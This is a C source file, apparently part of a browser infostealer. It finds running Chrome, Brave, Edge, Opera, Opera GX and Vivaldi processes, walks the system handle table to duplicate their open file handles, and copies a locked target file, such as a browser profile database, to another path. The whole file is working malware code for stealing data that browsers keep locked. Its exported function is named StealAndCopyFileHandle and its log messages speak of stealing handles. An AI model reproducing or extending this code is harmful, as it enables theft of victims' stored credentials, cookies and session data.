#include "HandleSteal.h"
#include <tlhelp32.h>

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Local definitions (from the original project's Structures.h)

#define SYSTEM_EXTENDED_HANDLE_INFORMATION     64      // SystemExtendedHandleInformation
#define NT_STATUS_INFO_LENGTH_MISMATCH         ((NTSTATUS)0xC0000004L)

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
    IN  ULONG   SystemInformationClass,
    IN  PVOID   SystemInformation,
    IN  ULONG   SystemInformationLength,
    OUT PULONG  ReturnLength OPTIONAL
    );

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR                           NumberOfHandles;
    ULONG_PTR                           Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX   Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Local wide-string helpers (no shlwapi / CRT string dependency)

static WCHAR LocalLowerW(IN WCHAR wcChar)
{
    return (wcChar >= L'A' && wcChar <= L'Z') ? (wcChar + 32) : wcChar;
}

// Case-insensitive substring: does "chrome.exe" contain "Chrome".
static BOOL LocalContainsIW(IN LPCWSTR pwszHaystack, IN LPCWSTR pwszNeedle)
{
    DWORD   cchHaystack = (DWORD)lstrlenW(pwszHaystack);
    DWORD   cchNeedle   = (DWORD)lstrlenW(pwszNeedle);

    if (cchNeedle == 0 || cchNeedle > cchHaystack)
        return FALSE;

    for (DWORD i = 0; (i + cchNeedle) <= cchHaystack; i++)
    {
        DWORD j = 0;

        while (j < cchNeedle && LocalLowerW(pwszHaystack[i + j]) == LocalLowerW(pwszNeedle[j]))
            j++;

        if (j == cchNeedle)
            return TRUE;
    }

    return FALSE;
}

// Case-insensitive suffix compare on a non NUL-terminated string (FileNameLength is in bytes).
static BOOL LocalEndsWithIW(IN LPCWSTR pwszString, IN DWORD cchString, IN LPCWSTR pwszSuffix)
{
    DWORD   cchSuffix = (DWORD)lstrlenW(pwszSuffix);

    if (cchSuffix > cchString)
        return FALSE;

    for (DWORD i = 0; i < cchSuffix; i++)
    {
        if (LocalLowerW(pwszString[cchString - cchSuffix + i]) != LocalLowerW(pwszSuffix[i]))
            return FALSE;
    }

    return TRUE;
}

// Heap-allocated process image name used for the snapshot match
// ("Opera" covers Opera GX too). Caller frees with HeapFree.
static LPSTR GetBrowserProcessName(IN BROWSER_TYPE Browser)
{
    CHAR    szName[BUFFER_SIZE_64]  = { 0 };
    BOOL    bFound                  = TRUE;

    if (Browser == BROWSER_CHROME)
        lstrcpyA(szName, "Chrome");
    else if (Browser == BROWSER_BRAVE)
        lstrcpyA(szName, "Brave");
    else if (Browser == BROWSER_EDGE)
        lstrcpyA(szName, "Msedge");
    else if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX)
        lstrcpyA(szName, "Opera");
    else if (Browser == BROWSER_VIVALDI)
        lstrcpyA(szName, "Vivaldi");
    else
        bFound = FALSE;

    return bFound ? DuplicateAnsiStringA(szName) : NULL;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Process enumeration

// Snapshot-based PID collection for every process whose image name contains the browser name.
static BOOL EnumerateBrowserProcesses(IN LPCWSTR pwszBrowserName, OUT PDWORD* ppdwPidArray, OUT PDWORD pdwPidCount)
{
    HANDLE          hSnapshot       = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W ProcessEntry32  = { 0 };
    PDWORD          pdwPids         = NULL,
                    pdwTemp         = NULL;
    DWORD           dwCount         = 0x00,
                    dwCapacity      = 16,
                    dwCurrentProcId = GetCurrentProcessId();
    BOOL            bResult         = FALSE;

    if (!pwszBrowserName || !ppdwPidArray || !pdwPidCount)
        return FALSE;

    *ppdwPidArray    = NULL;
    *pdwPidCount     = 0x00;
    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32W);

    if (!(pdwPids = (PDWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCapacity * sizeof(DWORD))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x00)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateToolhelp32Snapshot Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!Process32FirstW(hSnapshot, &ProcessEntry32))
    {
        printf("[!] Process32First Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    do
    {
        // Case-insensitive substring to match "Chrome" in "chrome.exe"
        if (LocalContainsIW(ProcessEntry32.szExeFile, pwszBrowserName))
        {
            // Skip Current Process
            if (dwCurrentProcId == ProcessEntry32.th32ProcessID)
                continue;

            // Expand If Required
            if (dwCount >= dwCapacity)
            {
                dwCapacity *= 2;

                if (!(pdwTemp = (PDWORD)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pdwPids, dwCapacity * sizeof(DWORD))))
                {
                    printf("[!] HeapReAlloc Failed With Error: %lu\n", GetLastError());
                    goto _END_OF_FUNC;
                }

                pdwPids = pdwTemp;
            }

            pdwPids[dwCount++] = ProcessEntry32.th32ProcessID;
        }

    } while (Process32NextW(hSnapshot, &ProcessEntry32));

    *ppdwPidArray  = pdwPids;
    *pdwPidCount   = dwCount;
    bResult        = TRUE;

_END_OF_FUNC:

    if (hSnapshot != INVALID_HANDLE_VALUE && hSnapshot)
        CloseHandle(hSnapshot);

    if (!bResult && pdwPids)
        HeapFree(GetProcessHeap(), 0, pdwPids);

    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Handle table walking

// Walks the global handle table, duplicates every file handle owned by the
// target PIDs and returns the first one whose name ends with pwszFilePath.
static BOOL FindAndDuplicateFileHandle(IN PDWORD pdwPidArray, IN DWORD dwPidCount, IN LPCWSTR pwszFilePath, OUT PHANDLE phDuplicatedHandle)
{
    fnNtQuerySystemInformation            pNtQuerySystemInformation = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX         pHandleInfo               = NULL;
    PFILE_NAME_INFO                       pFileNameInfo             = NULL;
    HMODULE                               hNtdllModule              = NULL;
    HANDLE                                hDuplicatedHandle         = NULL,
                                         hProcess                  = NULL;
    ULONG                                 ulBufferSize              = BUFFER_SIZE_8192,
                                         ulReturnLength            = 0x00,
                                         ulFileInfoSize            = sizeof(FILE_NAME_INFO) + (MAX_PATH * sizeof(WCHAR));
    ULONG_PTR                             ulLastPid                 = 0x00;
    NTSTATUS                              ntSTATUS                  = 0x00;
    BOOL                                  bResult                   = FALSE;
    const CHAR                            szNtdllName[]             = "ntdll.dll";
    const CHAR                            szNtQueryFuncName[]       = "NtQuerySystemInformation";

    if (!pdwPidArray || dwPidCount == 0 || !pwszFilePath || !phDuplicatedHandle)
        return FALSE;

    *phDuplicatedHandle = NULL;

    if (!(hNtdllModule = GetModuleHandleA(szNtdllName)) ||
        !(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdllModule, szNtQueryFuncName)))
    {
        printf("[!] Failed To Resolve NtQuerySystemInformation\n");
        return FALSE;
    }

    if (!(pFileNameInfo = (PFILE_NAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulFileInfoSize)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    while (TRUE)
    {
        if (!(pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBufferSize)))
        {
            printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
            goto _END_OF_FUNC;
        }

        if ((ntSTATUS = pNtQuerySystemInformation(SYSTEM_EXTENDED_HANDLE_INFORMATION, pHandleInfo, ulBufferSize, &ulReturnLength)) == NT_STATUS_INFO_LENGTH_MISMATCH)
        {
            HEAP_FREE(pHandleInfo);
            ulBufferSize = ulReturnLength * 2;
            continue;
        }

        if (ntSTATUS < 0)
        {
            printf("[!] NtQuerySystemInformation Failed With Error: 0x%08X\n", (unsigned int)ntSTATUS);
            goto _END_OF_FUNC;
        }

        break;
    }

    for (ULONG_PTR i = 0; i < pHandleInfo->NumberOfHandles && !bResult; i++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX pEntry = &pHandleInfo->Handles[i];
        BOOL                               bTargetProcess = FALSE;

        if (!(pEntry->GrantedAccess & FILE_READ_DATA))
            continue;

        for (DWORD j = 0; j < dwPidCount; j++)
        {
            if (pEntry->UniqueProcessId == (ULONG_PTR)pdwPidArray[j])
            {
                bTargetProcess = TRUE;
                break;
            }
        }
        if (!bTargetProcess) continue;

        if (pEntry->UniqueProcessId != ulLastPid)
        {
            if (hProcess) CloseHandle(hProcess);

            hProcess  = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)pEntry->UniqueProcessId);
            ulLastPid = pEntry->UniqueProcessId;
        }

        if (!hProcess) continue;

        if (!DuplicateHandle(hProcess, (HANDLE)pEntry->HandleValue, GetCurrentProcess(), &hDuplicatedHandle, 0x00, FALSE, DUPLICATE_SAME_ACCESS))
            continue;

        if (GetFileType(hDuplicatedHandle) != FILE_TYPE_DISK)
        {
            CloseHandle(hDuplicatedHandle);
            hDuplicatedHandle = NULL;
            continue;
        }

        memset(pFileNameInfo, 0, ulFileInfoSize);

        if (!GetFileInformationByHandleEx(hDuplicatedHandle, FileNameInfo, pFileNameInfo, ulFileInfoSize))
        {
            CloseHandle(hDuplicatedHandle);
            hDuplicatedHandle = NULL;
            continue;
        }

        if (LocalEndsWithIW(pFileNameInfo->FileName, pFileNameInfo->FileNameLength / sizeof(WCHAR), pwszFilePath))
        {
            printf("[i] Found Target File Handle In Process: %lu\n", (ULONG)pEntry->UniqueProcessId);
            *phDuplicatedHandle = hDuplicatedHandle;
            bResult = TRUE;
        }
        else
        {
            CloseHandle(hDuplicatedHandle);
            hDuplicatedHandle = NULL;
        }
    }

_END_OF_FUNC:

    if (hProcess)
        CloseHandle(hProcess);

    HEAP_FREE(pHandleInfo);
    HEAP_FREE(pFileNameInfo);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Copy through a duplicated handle

static BOOL CopyFileViaHandle(IN HANDLE hSourceFile, IN LPCSTR pszDestPath)
{
    HANDLE  hDestFile       = INVALID_HANDLE_VALUE;
    PBYTE   pBuffer         = NULL;
    DWORD   dwBytesRead     = 0x00,
            dwBytesWritten  = 0x00;
    BOOL    bResult         = FALSE;

    if (!hSourceFile || hSourceFile == INVALID_HANDLE_VALUE || !pszDestPath)
        return FALSE;

    if (!(pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, BUFFER_SIZE_8192)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if ((hDestFile = CreateFileA(pszDestPath, GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA Failed With Error: %lu\n", GetLastError());
        HEAP_FREE(pBuffer);
        return FALSE;
    }

    if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER && GetLastError() != NO_ERROR)
    {
        printf("[!] SetFilePointer Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    while (ReadFile(hSourceFile, pBuffer, BUFFER_SIZE_8192, &dwBytesRead, NULL) && dwBytesRead > 0x00)
    {
        if (!WriteFile(hDestFile, pBuffer, dwBytesRead, &dwBytesWritten, NULL) || dwBytesWritten != dwBytesRead)
        {
            printf("[!] WriteFile Failed With Error: %lu\n", GetLastError());
            goto _END_OF_FUNC;
        }
    }

    bResult = TRUE;

_END_OF_FUNC:

    if (hDestFile != INVALID_HANDLE_VALUE)
        CloseHandle(hDestFile);

    HEAP_FREE(pBuffer);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Public entry

BOOL StealAndCopyFileHandle(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath, IN LPCSTR pszDstPath)
{
    WCHAR   wszBrowserName[MAX_PATH] = { 0 };
    WCHAR   wszRelPath[MAX_PATH]     = { 0 };
    PDWORD  pdwPidArray              = NULL;
    DWORD   dwPidCount               = 0x00;
    HANDLE  hDuplicatedHandle        = NULL;
    LPSTR   pszBrowserName           = NULL;
    LPSTR   pszProcessName           = NULL;
    BOOL    bResult                  = FALSE;

    pszBrowserName = GetBrowserName(Browser);
    pszProcessName = GetBrowserProcessName(Browser);

    if (!pszBrowserName || !pszProcessName || !pszRelPath || !pszDstPath)
        goto _END_OF_FUNC;

    if (!MultiByteToWideChar(CP_ACP, 0x00, pszProcessName, -1, wszBrowserName, MAX_PATH))
        goto _END_OF_FUNC;

    if (!MultiByteToWideChar(CP_ACP, 0x00, pszRelPath, -1, wszRelPath, MAX_PATH))
        goto _END_OF_FUNC;

    if (!EnumerateBrowserProcesses(wszBrowserName, &pdwPidArray, &dwPidCount) || dwPidCount == 0x00)
    {
        printf("[i] No Running %s Process Found\n", pszBrowserName);
        goto _END_OF_FUNC;
    }

    printf("[i] Found %lu Running Browser Processes\n", dwPidCount);
    printf("[v] Attempting To Steal Opened File Handles...\n");

    if (FindAndDuplicateFileHandle(pdwPidArray, dwPidCount, wszRelPath, &hDuplicatedHandle))
    {
        if (CopyFileViaHandle(hDuplicatedHandle, pszDstPath))
        {
            printf("[v] Successfully Copied File Via Duplicated Handle\n");
            bResult = TRUE;
        }
    }

_END_OF_FUNC:

    if (hDuplicatedHandle)
        CloseHandle(hDuplicatedHandle);

    HEAP_FREE(pdwPidArray);
    HEAP_FREE(pszBrowserName);
    HEAP_FREE(pszProcessName);

    return bResult;
}
